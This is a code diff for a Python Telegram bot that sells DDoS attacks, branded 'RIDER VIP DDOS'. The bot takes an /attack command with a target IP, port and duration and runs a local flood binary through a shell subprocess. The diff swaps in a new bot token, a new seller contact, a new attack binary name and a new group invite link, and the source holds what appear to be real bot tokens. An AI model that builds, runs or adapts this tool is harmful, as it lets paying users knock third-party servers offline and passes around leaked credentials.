@@ -3,7 +3,7 @@ import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7320071284:AAFZ8UgEiLKO4BEgkDm44w-kzYGnMXW6l7Y'
+TELEGRAM_BOT_TOKEN = '7244755332:AAFysIz0KdiB9h7BgbOrlHGyrUGfalDxomM'
 ADMIN_USER_ID = 1739558531
 USERS_FILE = 'users.txt'
 LOG_FILE = 'log.txt'
@@ -71,7 +71,7 @@ async def start(update: Update, context: CallbackContext):
     message = (
         "*❤️Welcome to the RIDER VIP DDOS ❤️*\n\n"
         "*Use /attack <ip> <port> <duration>*\n"
-        "* DM TO BUY :- @RIDERBHAI00 *"
+        "* DM TO BUY :- @TF_CLANOP *"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -134,7 +134,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./2111 {ip} {port} {duration} 800"
+        command = f"./ranbal {ip} {port} {duration} 800"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -191,7 +191,7 @@ async def attack(update: Update, context: CallbackContext):
         f"*⚔️ Attack Launched! ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
         f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Join :- https://t.me/+628Urx0txK80NDc1 💥*"
+        f"*🔥 Join :- https://t.me/+i1f5jeivW2xjNWU1 💥*"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
